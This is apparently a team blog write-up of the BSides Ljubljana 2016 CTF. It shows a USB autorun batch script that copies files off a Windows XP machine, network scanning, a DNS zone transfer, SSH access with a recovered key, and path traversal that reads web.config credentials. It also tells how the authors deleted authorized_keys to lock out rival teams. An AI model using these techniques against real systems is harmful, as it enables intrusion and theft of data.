---
layout: post
title:  "BSides Ljubljana CTF 2016"
author: f0rki, verr
categories: writeup
---

This year we attended [BSides Ljubljana](https://bsidesljubljana.si/) for the first time. We attended, because security conferences in our area are rare, and because it sounded interesting. Besides an awesome atmosphere there was also [a nice CTF](https://bsidesljubljana.si/ctf/). So we more or less spontaneously sat down on a cozy sofa, grabbed our computers, and played our first on-site CTF ever. And [we won](https://ctf.viris.si/BSidesLjubljana0x7E0CTF/rezultati/)! \o/

BSides Ljubljana CTF was not like a typical jeopardy CTF, which was new to us and kind of refreshing. It felt more like a penetration test. [The Tasks](https://ctf.viris.si/BSidesLjubljana0x7E0CTF/naloge/) were split in two categories: Jeopardy and Hacking.

There were 5 Jeopardy Tasks and 19 Hacking Tasks. The jeopardy tasks were pretty clear and similar to other CTFs. For the Hacking tasks we were given a network range and tasked to find the flags. The flags were scattered all over the services that were running in the target network. For the hacking tasks the flag format was `CTF#N:Keyword`, with `N` being the challenge number.

It was kind of fun although we missed a lot of flags, which we just overlooked. In the middle of the game we revisited all the services to search for flags again. This revealed quite a lot of the flags, which weren't worth so many points.

In the end we managed to solve all 5 Jeopardy Tasks and 11 of out 19 Hacking Tasks, scoring 2060 points; beating teams *scannet* (1310 points) and *b33rm0nster* (1060 points).

We don't remember all the tasks, and the website is not showing the task descriptions anymore, so the following writeup is very probably incomplete.

## Jeopardy Tasks

### Simple forensics

The second task gave us a bitmap image. We were able to retrieve the flag using the most basic forensics tool available:

```
% strings 160221_message.bmp
BM6S
www.fars.si
```

### Extract flag file from Windows XP machine with only USB stick

There was a physical machine in one of the conference rooms running Windows XP, with a *flag.txt* one the desktop. We were only allowed to plug in a usb drive and then plug it out again. So we did a quick search and apparently unpatched Windows XP versions run autorun stuff automatically from USB drives (just like CDs back in the early days). So we created a usb drive with the following `autorun.inf` file:

```
[AutoRun]
UseAutoPlay=1
open=pwn.bat
```

Of course we didn't have a Windows XP VM ready, so it was kind of hard to test.
We needed several attempts, for which one of us had to get up and walk to the
computer, plug it in and watch it fail. Too bad we don't know how-to-windows ... In the end we still don't know which one of the copy commands was
the right one, but we got the flag using the following script, so whatever.
¯\_(ツ)_/¯

```
@echo off

echo hmmm

copy "%HOMEPATH%\Desktop\flag.txt"
copy "%HOMEPATH%\Desktop\flag.txt" .
copy "%HOMEPATH%\Desktop\flag.txt" "%CD%"
copy "%HOMEPATH%\Desktop\flag.txt" D:\
copy "C:\Documents and Settings\Administrator\Desktop\flag.txt" D:\
copy "C:\Documents and Settings\CTF\Desktop\flag.txt" D:\

echo "#### CWD" >>listing.log
echo %CD% >>listing.log
dir >>listing.log
echo "#### home/desktop" >> listing.log
cd "%HOMEPATH%"
dir >>D:\listing.log
echo "#### desktop" >> D:\listing.log
cd Desktop
dir >>D:\listing.log

echo "#### users" >> D:\listing.log
cd ..
dir >>D:\listing.log
```

### Simple XOR Cipher

We were given a "pseudo code" description of a simple cipher and the task was to submit the ciphertext. Below is our solution:

```python
"""
key is "iamsobroken"
cipher is hex string
while char at message; do

temp is hex char XOR hex key at index of char MOD key length
append temp to cipher

done
"""

key = "iamsobroken"
message = "I have a bad feeling about Asterix"
cipher = []

for i, m in enumerate(message):
    m = ord(m)
    k = ord(key[(i) % len(key)])
    t = m ^ k
    cipher.append(t)

#print "".join(chr(c) for c in cipher)
print "".join(hex(c)[2:].zfill(2) for c in cipher)
```

### Retrieve contents of the floppy disk badge

The conference badge handed out to all conference participants a floppy disk. And since one of the Jeopardy challenges mentioned a floppy, we knew what to do ... but of course, we traveled to Ljubljana without a floppy drive.

We then first tried to use the old Windows XP computer to get the contents of the floppy, but the build-in reader was not connected. But one of the organizers at the front-desk had a USB floppy drive, so we nicely asked to borrow it. That way we retrieved the `FLAG.txt` file from the floppy and a file called `faq-root`, which will become important later.


## Hacking Tasks

The hacking part of the competition began with very little information. Only the following information was provided to us:

```
Your target is behind 192.168.66.0/24.
Maybe your starting point should be 192.168.66.6.
```

### The network setup

A quick nmap revealed the following hosts in the network. For your convenience, we annotated the output with our later findings.

```
Nmap scan report for 192.168.66.1
Host is up (0.0054s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 192.168.66.5
Host is up (0.0047s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
443/tcp  open  https          -- ctf#16 remote login
3389/tcp open  ms-wbt-server
4444/tcp open  krb524

Nmap scan report for 192.168.66.6
Host is up (0.0073s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http            -- starting point: qr code #13, android app, also validateqr
4444/tcp open  krb524

Nmap scan report for 192.168.66.7
Host is up (0.0075s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh              -- login via faq-root key --> #5 in mysql db
80/tcp   open  http             -- FAQ service
4444/tcp open  krb524

Nmap scan report for 192.168.66.8
Host is up (0.0075s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http             -- posbox --> posbox .net app, 404 page
4444/tcp open  krb524

Nmap scan report for 192.168.66.15
Host is up (0.0039s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE  VERSION
53/tcp   open  domain   ISC BIND 1.0
```

We were not able to find all the hostnames at the beginning (which was necessary for accessing services using vhosts), because the network used a custom DNS resolver. As soon as we found their DNS resolver (at `192.168.66.15`), we could get all the hostnames of the machines by using reverse lookups or doing a DNS zone transfer.

```
$ dig @192.168.66.15 fars.si AXFR

; <<>> DiG 9.10.3-P3-RedHat-9.10.3-10.P3.fc23 <<>> @192.168.66.15 fars.si AXFR
; (1 server found)
;; global options: +cmd
fars.si.                       604800        IN        SOA        ns1.fars.si. admin.fars.si. 4 604800 86400 2419200 604800
fars.si.                       604800        IN        NS        ns1.fars.si.
faq.fars.si.                   604800        IN        A         192.168.66.7
ns1.fars.si.                   604800        IN        A         192.168.66.15
posbox.fars.si.                604800        IN        A         192.168.66.8
remote.fars.si.                604800        IN        A         192.168.66.5
reverselookupeverything.fars.si. 604800      IN        A         192.168.66.251
www.fars.si.                   604800        IN        A         192.168.66.6
fars.si.                       604800        IN        SOA       ns1.fars.si. admin.fars.si. 4 604800 86400 2419200 604800
;; Query time: 3 msec
;; SERVER: 192.168.66.15#53(192.168.66.15)
;; WHEN: Wed Mar 09 14:36:40 CET 2016
;; XFR size: 9 records (messages 1, bytes 263)
```

We set up our host files to contain the hostnames:

```
192.168.66.5 remote.fars.si
192.168.66.6 validateqr.fars.si
192.168.66.7 faq.fars.si
192.168.66.8 posbox.fars.si
192.168.66.15 ns1.fars.si
```

### Welcome page at 192.168.66.6

Visiting `192.168.66.6` (the only IP provided to us on the competition page) gave us a welcome page with a link to a file called `qr.txt` and `app.apk`. It also contained a link to the FAQ system on `192.168.66.7`.

### Reading the QR code

`qr.txt` was a text file that contained a QR code that was converted to ascii
art. Using a 1px font size in gedit yielded the following picture, which we were not able to scan yet:

![](/images/posts/2016-03-17-blctf-qr-gedit.png)

We took a screenshot and did some post processing in gimp to make the contrast
higher. This was good enough to be scanned:

![](/images/posts/2016-03-17-blctf-qr-post.png)

### Decompiling the Android app

The welcome page also provided an Android app in form of an `app.apk`. We were able to decompile it using the *Jadx* decompiler for Android. After browsing the code and especially looking at the login routines we discovered a flag:

```
$ pss -i "this.flag"
./com/prosoft/posbox/business/api/service/helpers/NetworkRequestParams.java
22:        this.flag = "Q1RGIzE3OiBIb3cgbWFueSBmbGFncyBkaWQgeW91IG1pc3M/";
36:        this.flag = "Q1RGIzE3OiBIb3cgbWFueSBmbGFncyBkaWQgeW91IG1pc3M/";

$ echo "Q1RGIzE3OiBIb3cgbWFueSBmbGFncyBkaWQgeW91IG1pc3M/" | base64 -d
CTF#17: How many flags did you miss?
```

(So probably we missed at least one other flag here ...)

### SNMP

`HINT: SNMP`

After the organizers provided a hint on the competition page to look at SNMP (Simple Network Management Protocol) we used [*snmpcheck*](https://libraries.io/github/mcantoni/snmpcheck) to query all hosts. (We later learned that there are Metasploit modules available which help you doing that.) One host was configured in a way that allowed us to read a lot of information via SNMP. After trying to pwn the misconfigured host using the extracted information, we reviewed the *snmpcheck* output and finally found a flag in one of the properties ...

### Root on FAQ system

The floppy used in an earlier task also contained a file called `faq-root`, which contained an ssh private key. Unfortunately the key was password protected. From the name of the file, it was pretty clear that this was the way to login at 192.168.66.7 (the phpMyFAQ system) as root. Sometime in the middle of the CTF the following hint was released:

    HINT: Try to link the contest of your floppy and the Morse code on it!

Even before the CTF started, we noticed that there was a morse code on the floppy badge, which we immediately decoded:

    -... ... .. -.. . ... .-.. .--- ..- -... .-.. .--- .- -. .- ----- -..- --... . -----

    BSIDESLJUBLJANA0X7E0

And it was actually the password for the the ssh key.

    ssh -i ./root-faq root@192.168.66.7
    # cat FLAG
    CTF#6:DON'T WASTE YOUR TIME HERE ANYMORE!
    actual submission:
    DONTWASTEYOURTIMEHEREANYMORE

Now we did something pretty nasty on the system. We removed the original
`authorized_keys` file to delay other teams. Of course this was noticed at some point, and the organizers restored the VM snapshot, allowing other teams to connect.

There was also a file with the mysql root password on the host (of course we could've also changed that one).

    $ cat mysql
    SET PASSWORD FOR 'root'@'localhost' = PASSWORD('mysql.pass');

So we explored and dumped the database using *mysqldump*. We then grepped for flags in the sql dump, which revealed another flag.

    cat dump.sql | grep -i ctf
    INSERT INTO `faqfaqnews` VALUES (1,'sl','Novica','<p>Fars sistem razpadel</p>\r\n<p> </p>\r\n<p> </p>\r\n<p>CTF#5 Backend</p>','20160229215345','Admin','milan.gabor@gmail.com','n','n','00000000000000','99991231235959','http://www.fars.si','','');

We don't know if this flag was supposed to be retrieved via the FAQ web
service.

### The .net Posbox app

The Android app given on the welcome page did not only contain the already mentioned flag, but also an API endpoint at `posbox.fars.si`.

```
D/UserManagementService( 4543): handleActionLogin
W/System.err( 4543): java.net.UnknownHostException: Unable to resolve host "posbox.fars.si": No address associated with hostname
```

After modifying our hostfile in the way described above, we were able to access the Posbox webpage. It was in Slovenian, but we were able to navigate the page. The login on the site was secured by a captcha and did not contain any obvious vulnerabilities. After looking at the site again, we were able to find another client for the service.

The download link for the app installer was:
`http://posbox.fars.si/home?file=setup.exe`

So after an Android app, this time they provided a C# app. The provided `setup.exe` only contained some kind of downloader, so we had to look into the binary to find the link to the actual binary. After downloading it, we again used a decompiler to decompile the app, and then looked at the code.

Somewhere in the middle of the code there was the following line, which we then used to login to the Posbox web interface.

```C#
if (this.Username == "fars@bsidesljubljana.si" && this.Password == "SuperSecurePassword")
```

### Retrieving the web.config

After desperately looking for more flags, we got a hint from one of the organizers to look at Posbox again. We tried to get `/etc/passwd` on the Posbox host using path traversal on the `file=` http parameter, but then the organizer reminded us the host was windows running IIS and we should try `web.config`.

`http://posbox.fars.si/home?file=web.config` actually worked.

The file contained database credentials, which are also a flag. We haven't used
the credentials for anything else, since the database wasn't available over the
network.

```
<configuration>
  <system.webServer>
    <handlers>
      <add name="httpplatformhandler" path="*" verb="*" modules="httpPlatformHandler" resourceType="Unspecified" />
    </handlers>
    <httpPlatform processPath="..\approot\web.cmd" arguments="" stdoutLogEnabled="false" stdoutLogFile="..\logs\stdout.log" startupTimeLimit="3600"></httpPlatform>
  </system.webServer>
  <connectionStrings>
    <add name="CTF#9" connectionString="server=localhost;database=myDb;uid=myUser;password=HereWeAreHereWeGo;" />
                <!-- CTF9: HereWeAreHereWeGo-->
  </connectionStrings>
  <system.serviceModel>
    <bindings>
      <basicHttpBinding>
        <binding name="BasicHttpBinding_IQRValidator" />
      </basicHttpBinding>
    </bindings>
    <client>
      <endpoint address="http://validateqr.fars.si/QRValidator.svc" binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_IQRValidator" contract="ServiceReference1.IQRValidator" name="BasicHttpBinding_IQRValidator" />
    </client>
  </system.serviceModel>
</configuration>
```

But we can see the validateqr endpoint as hint for the next challenge.

### Flags in the webservices

Some easier flags we found on the way by looking closely at everything (and then looking again):

 - The FAQ system set a Cookie that contained a flag.
 - The welcome page sent a custom HTTP header containing a flag.
 - If you were logged in, the HTML source of the 404 page of `posbox.fars.si`
   contained a flag.
 - Visiting `192.168.66.5` with the hostname `remote.fars.si` over https
   revealed another flag.

![](/images/posts/2016-03-17-blctf-remote-fars-si.png)

### Posbox readme.html

Pretty late in the CTF the following hint was released:

    HINT: posbox.fars.si/logs

There you could retrieve an IIS log file and also the `readme.html` file:

```
<!DOCTYPE html>
<html>
<head>
</head>
<body>
  	<div style="display: none;">INKEMIZRGA5CAQTBONSUK3TDN5SGKZCCNFTUI4TBM5XW44Y=</div>
</body>
</html>
```

This time the flag was base32 encoded:

```
>>> base64.b32decode("INKEMIZRGA5CAQTBONSUK3TDN5SGKZCCNFTUI4TBM5XW44Y=")
'CTF#10: BaseEncodedBigDragons'
```

We found this flag a little too late, shortly after the CTF ended (which we didn't realize for a few minutes).

### validateqr.fars.si

`http://validateqr.fars.si/QRValidator.svc` was running on `192.168.66.6`,
which we found by trial and error. We could retrieve the WSDL file but didn't
manage to actually do something remotely useful with the web service.

Apparently we should've used xml external entities to retrieve further
credentials.

We only later learned the ofllowing:

```
.svc, a file extension used by Microsoft's Windows Communication Foundation to represent a service hosted by Internet Information Services
```

And then we ran out of time ...

<blockquote class="twitter-tweet" data-lang="de"><p lang="en" dir="ltr">Apparently <a href="https://twitter.com/hashtag/BSidesLjubljana?src=hash">#BSidesLjubljana</a> CTF is over. And apparently we won! \o/ <a href="https://t.co/WoxPXKmi21">pic.twitter.com/WoxPXKmi21</a></p>&mdash; LosFuzzys (@LosFuzzys) <a href="https://twitter.com/LosFuzzys/status/707613616653115392">9. März 2016</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

*So Long, and Thanks for All the Fish*
